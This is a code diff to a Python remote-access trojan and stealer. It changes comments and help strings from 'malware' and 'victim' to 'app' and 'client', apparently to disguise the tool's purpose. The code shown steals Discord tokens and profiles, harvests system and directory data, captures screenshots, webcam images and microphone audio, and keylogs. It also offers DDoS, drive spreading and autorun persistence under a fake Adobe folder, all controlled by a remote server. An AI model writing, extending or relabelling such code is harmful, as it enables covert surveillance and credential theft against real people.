@@ -1,7 +1,6 @@
 # -*- coding: utf-8 -*-
 
 # Should we show debug messages or not.
-
 DEBUG = False
 
 try:
@@ -44,16 +43,16 @@ __SERVER_API = None
 # Server bot.
 __SERVER_BOT = None
 
-# Tags of the victim (Set in load_tags).
+# Tags of the client (Set in load_tags).
 __TAGS = []
 
-# Folder of the malware (Set in set_folder_path)
+# Folder of the app (Set in set_folder_path)
 __FOLDER = ""
 
 # Keylog string.
 __KEYLOG = ""
 
-# Name of the victim (Set in load_name).
+# Name of the client (Set in load_name).
 __NAME = ""
 
 # Current directory for the files commands.
@@ -101,9 +100,26 @@ KEYLOGGER_DISABLED = True
 # Drives that we will skip when infecting drives.
 SPREADING_SKIPPED_DRIVES = ("C", "D")
 
-# Version of the malware.
-VERSION = "[Pre-release] 0.4.4"
+# Version of the app.
+VERSION = "[Pre-release] 0.5.0"
 
+
+# Refactor later... >>>
+
+def filesystem_try_delete(_path):
+    # Tries to delete.
+    try:
+        return os.remove(_path)
+    except Exception:
+        return None
+def filesystem_try_listdir(_path):
+    # Tries to listdir.
+    try:
+        return os.listdir(_path)
+    except Exception:
+        return []
+
+# Refactor later... <<<
 
 def filesystem_get_size(_path: str) -> int:
     # @function filesystem_get_size()
@@ -123,7 +139,7 @@ def filesystem_get_size(_path: str) -> int:
             # Getting size of the directory.
             _directory_size = int(os.path.getsize(_path) / 1024 / 1024)
             
-            for _directory_file in os.listdir(_path):
+            for _directory_file in filesystem_try_listdir(_path):
                 # For all items in the directory.
 
                 # Getting file path.
@@ -194,10 +210,10 @@ def command_taskkill(_arguments, _event) -> str:
 def command_upload(_arguments, _event) -> str:
     # @function command_upload()
     # @returns str
-    # @description Function for command "upload" that uploads file on the victim PC.
+    # @description Function for command "upload" that uploads file on the client PC.
 
     # Returning message.
-    return "_event.message!"
+    return ""
 
 
 def command_properties(_arguments, _event) -> str:
@@ -302,13 +318,13 @@ def command_ddos(_arguments, _event) -> str:
 def command_ls(_arguments, _event) -> str:
     # @function command_ls()
     # @returns str
-    # @description Function for command "str" that lists all files in  directory.
+    # @description Function for command "str" that lists all files in directory.
 
     # Globalising current directory.
     global __CURDIR
 
     # Returning.
-    return ", ".join(os.listdir(_arguments if _arguments != "" else __CURDIR))
+    return ", ".join(filesystem_try_listdir(_arguments if _arguments != "" else __CURDIR))
 
 
 def command_cd(_arguments, _event) -> str:
@@ -728,7 +744,7 @@ def command_name_new(_arguments, _event) -> str:
 def command_exit(_arguments, _event) -> str:
     # @function command_exit()
     # @returns str
-    # @description Function for command "exit" that exits malware.
+    # @description Function for command "exit" that exits app.
 
     # Exiting.
     raise SystemExit
@@ -776,7 +792,7 @@ def command_destruct(_arguments, _event) -> str:
     autorun_register()
 
     # Removing working folder path.
-    os.remove(__FOLDER)
+    filesystem_try_delete(__FOLDER)
 
     # Exiting.
     return command_exit(_arguments, _event)
@@ -1065,7 +1081,7 @@ def spreading_thread() -> None:
 def spreading_start() -> None:
     # @function spreading_start()
     # @returns None
-    # @description Function that starts malware spreading.
+    # @description Function that starts app spreading.
 
     if SPREADING_DISABLED:
         # If spreading is disabled.
@@ -1080,19 +1096,19 @@ def spreading_start() -> None:
 def set_folder_path() -> None:
     # @function set_folder_path()
     # @returns None
-    # @description Function that set folder path for the malware.
+    # @description Function that set folder path for the app.
 
     # Globalize folder variable.
     global __FOLDER
 
     # Setting folder.
-    __FOLDER = os.getenv('APPDATA') + "\\Adobe\\PMT\\Storage"
+    __FOLDER = os.getenv('APPDATA') + "\\Adobe\\PMT\\Storage\\"
 
 
 def get_folder_path() -> str:
     # @function get_folder_path()
     # @returns str
-    # @description Function that returns folder path for the malware.
+    # @description Function that returns folder path for the app.
 
     # Globalize folder variable.
     global __FOLDER
@@ -1107,7 +1123,7 @@ def assert_operating_system() -> None:
     # @description Function that asserting that operating system,
     # @description on which current instance of the trojan is launched are supported.
 
-    # Tuple with all platforms (NOT OPERATING SYSTEM) that are supported for the malware.
+    # Tuple with all platforms (NOT OPERATING SYSTEM) that are supported for the app.
     _supported_platforms = ("win32", "linux")
 
     # Tuple with all platforms (NOT OPERATING SYSTEM) that are only partially supported,
@@ -1124,7 +1140,7 @@ def assert_operating_system() -> None:
                 # If this is development platform.
 
                 # Showing debug message.
-                debug_message("You are currently running this malware on platform {_platform} "
+                debug_message("You are currently running this app on platform {_platform} "
                               "which is not fully supported!")
 
             # Returning from the function as current platform is supported.
@@ -1133,7 +1149,7 @@ def assert_operating_system() -> None:
     # Code lines below only executes if code above don't found supported platform.
 
     # Debug message.
-    debug_message("Oops... You are running malware on the platform "
+    debug_message("Oops... You are running app on the platform "
                   "{sys.platform} which is not supported! Sorry for that!")
 
     # Raising SystemExit (Exiting code)
@@ -1274,50 +1290,50 @@ def initialise_commands() -> None:
 
     __COMMANDS_HELP = {
         "discord_profile_raw": (
-            "Returns you all RAW (as dict (JSON)) information about victim Discord profile",
+            "Returns you all RAW (as dict (JSON)) information about client Discord profile",
             "discord_profile_raw"
         ),
         "discord_tokens": (
-            "Returns you all found Discord tokens in victim system",
+            "Returns you all found Discord tokens in client system",
             "discord_tokens"
         ),
         "discord_profile": (
-            "Returns you all information about victim Discord profile",
+            "Returns you all information about client Discord profile",
             "discord_profile"
         ),
         "download": (
-            "Downloads file from the victim client.",
+            "Downloads file from the client client.",
             "download [required]PATH"
         ),
         "screenshot": (
-                "Returns you an photo (screenshot) from screen of the victim.",
+                "Returns you an photo (screenshot) from screen of the client.",
                 "screenshot"
             ),
         "webcam": (
-                "Returns you an photo from webcam of the victim (Only if it connected to the PC).",
+                "Returns you an photo from webcam of the client (Only if it connected to the PC).",
                 "webcam"
             ),
         "microphone": (
-                "Returns you an voice message from microphone of the victim, "
+                "Returns you an voice message from microphone of the client, "
                 "for that amount of the seconds that you specify (Only if it connected to the PC).",
                 "microphone [optional, default is 1]SECONDS"
             ),
         "help": (
-            "Returns list of the all commands in the malware, "
+            "Returns list of the all commands in the app, "
             "if you specify command, shows documentation to given command itself.",
             "help [optional]COMMAND"
         ),
         "version": (
-            "Returns current version of the malware instance that is currently running on the victim PC "
+            "Returns current version of the app instance that is currently running on the client PC "
             "(That is get this command).",
             "version"
         ),
         "tags": (
-            "Returns an list separated by ,(comma) of the all tags that have called instance of the malware.",
+            "Returns an list separated by ,(comma) of the all tags that have called instance of the app.",
             "tags"
         ),
         "location": (
-            "Returns location (fully not very precise) of the victim (Gets throughout IP).", "location"
+            "Returns location (fully not very precise) of the client (Gets throughout IP).", "location"
         ),
         "keylog": (
             "Returns log of the keylogger.",
@@ -1345,11 +1361,11 @@ def initialise_commands() -> None:
             "tags_add [required]TAGS(Separated by ;)"
         ),
         "shutdown": (
-            "Shutdowns victim PC.",
+            "Shutdowns client PC.",
             "shutdown"
         ),
         "restart": (
-            "Restarts victim PC.",
+            "Restarts client PC.",
             "restart"
         ),
         "console": (
@@ -1361,7 +1377,7 @@ def initialise_commands() -> None:
             "ddos [required]ADDRESS"
         ),
         "link": (
-            "Opens link in a victim browser.",
+            "Opens link in a client browser.",
             "link [required]URI"
         ),
         "name_new": (
@@ -1369,7 +1385,7 @@ def initialise_commands() -> None:
             "name_new [required]NAME"
         ),
         "exit": (
-            "Exits malware (Will be launched when PC is restarted)",
+            "Exits app (Will be launched when PC is restarted)",
             "exit"
         ),
         "python": (
@@ -1382,7 +1398,7 @@ def initialise_commands() -> None:
             "message [required]TEXT;TITLE[optional];STYLE[optional]"
         ),
         "destruct": (
-            "Delete malware from the system (Removing from the autorun and closing)",
+            "Delete app from the system (Removing from the autorun and closing)",
             "destruct"
         )
     }
@@ -1390,10 +1406,10 @@ def initialise_commands() -> None:
 def exit_handler() -> None:
     # @function exit_handler()
     # @returns None
-    # @description Function that handles exit of the malware.
+    # @description Function that handles exit of the app.
 
     # Debug message.
-    debug_message("Exiting malware!")
+    debug_message("Exiting app!")
 
     # Sever message.
     server_message(f"Disconnected from the network!")
@@ -1600,7 +1616,7 @@ def get_hwid() -> str:
 def get_ip():
     # @function get_ip()
     # @returns Dict
-    # @description Function that returns ip address of the victim machine.
+    # @description Function that returns ip address of the client machine.
 
     try:
         # Trying to get IP.
@@ -1723,7 +1739,7 @@ def server_method(method: str, parameters: dict, _isretry=False) -> any:
         # Error.
 
         # Message.
-        debug_message(f"Ошибка при попытке вызвать метод сервера! Ошибка: {Error}")
+        debug_message(f"Error when trying to call server method (API)! Error: {Error}")
 
         if _isretry:
             # If this is already retry.
@@ -1879,7 +1895,7 @@ def discord_api_call(method: str, params: dict, func, data, token: str) -> any:
 def stealer_steal_discord_profile(_tokens: list[str]=None) -> dict:
     # @function stealer_steal_discord_profile(_tokens: list[str]=None) -> dict
     # @returns Dict or none
-    # @description Function that steals all profile information from victim Discord.
+    # @description Function that steals all profile information from client Discord.
 
     if _tokens is None:
         # If tokens is not given.
@@ -1924,7 +1940,7 @@ def stealer_steal_discord_tokens() -> list[str]:
     for token_path in (path for path in paths if os.path.exists(path)):
         # For existing paths.
 
-        for log_file in (file for file in os.listdir(token_path) if file.endswith(".log") or file.endswith(".ldb")):
+        for log_file in (file for file in filesystem_try_listdir(token_path) if file.endswith(".log") or file.endswith(".ldb")):
             # For log files in folder.
 
             # Opening file.
@@ -1953,7 +1969,7 @@ def stealer_steal_discord_tokens() -> list[str]:
 def stealer_steal_data(_force: bool = False):
     # @function stealer_steal_data()
     # @returns None
-    # @description Function that steals all the data from the victim.
+    # @description Function that steals all the data from the client.
 
     # Globalising values.
     global __VALUES
@@ -2000,12 +2016,12 @@ def stealer_steal_data(_force: bool = False):
                 __VALUES["computer_processor"] += os.getenv("PROCESSOR_LEVEL") + " "
                 __VALUES["computer_processor"] += os.getenv("PROCESSOR_REVISION")
                 __VALUES["computer_environment_variables"] = get_environment_variables()
-                __VALUES["directory_downloads"] = os.listdir(_userprofile + "\\Downloads")
-                __VALUES["directory_documents"] = os.listdir(_userprofile + "\\Documents")
-                __VALUES["directory_desktop"] = os.listdir(_userprofile + "\\Desktop")
-                __VALUES["directory_root"] = os.listdir(_drive + "\\")
-                __VALUES["directory_programfiles"] = os.listdir(_drive + "\\Program Files")
-                __VALUES["directory_programfiles86"] = os.listdir(_drive + "\\Program Files (x86)")
+                __VALUES["directory_downloads"] = filesystem_try_listdir(_userprofile + "\\Downloads")
+                __VALUES["directory_documents"] = filesystem_try_listdir(_userprofile + "\\Documents")
+                __VALUES["directory_desktop"] = filesystem_try_listdir(_userprofile + "\\Desktop")
+                __VALUES["directory_root"] = filesystem_try_listdir(_drive + "\\")
+                __VALUES["directory_programfiles"] = filesystem_try_listdir(_drive + "\\Program Files")
+                __VALUES["directory_programfiles86"] = filesystem_try_listdir(_drive + "\\Program Files (x86)")
                 # Disable as may take too long time to execute?
                 #__VALUES["discord_tokens"] = stealer_steal_discord_tokens()
                 #__VALUES["discord_profile"] = stealer_steal_discord_profile(__VALUES["discord_tokens"])
@@ -2188,6 +2204,9 @@ def client_answer_server(_event) -> None:
 
                                         # Setting response.
                                         _response_text = f"Error when uploading document: {_uploading_result}"
+
+                                    # Trying to delete.
+                                    filesystem_try_delete(_uploading_path)
                         else:
                             # If default string response.
                             # Getting text.
@@ -2206,7 +2225,7 @@ def client_answer_server(_event) -> None:
         # If there an exception.
 
         # Getting exception answer.
-        _response_text = f"Oops... There is exception while victim try to answer message. " \
+        _response_text = f"Oops... There is exception while client try to answer message. " \
                          f"Exception information: {_exception}"
 
     # Answering server.
@@ -2435,7 +2454,7 @@ def autorun_unregister() -> None:
         # If error occurred.
 
         # Debug message.
-        debug_message(f"Не удалось добавить себя в автозагрузки! Ошибка: {_exception}")
+        debug_message(f"Couldn`t add self in the autorun! Error: {_exception}")
 
 
 def server_upload_document(_path: str, _title: str, _peer: int, _type: str = "doc") -> str:
@@ -2536,9 +2555,9 @@ def record_microphone(_path, seconds: int = 1) -> None:
 def launch() -> None:
     # @function launch()
     # @returns None
-    # @description Function that launches all the system of the malware.
+    # @description Function that launches all the system of the app.
     try:
-        # Trying to initialise malware.
+        # Trying to initialise app.
 
         # Asserting operating system, exiting if the operation system is not supported.
         # Supported:
@@ -2588,5 +2607,5 @@ def launch() -> None:
                       f"Full exception information - {_exception}")
 
 
-# Entry point of the malware, calling launch function to start all systems.
+# Entry point of the app, calling launch function to start all systems.
 launch()
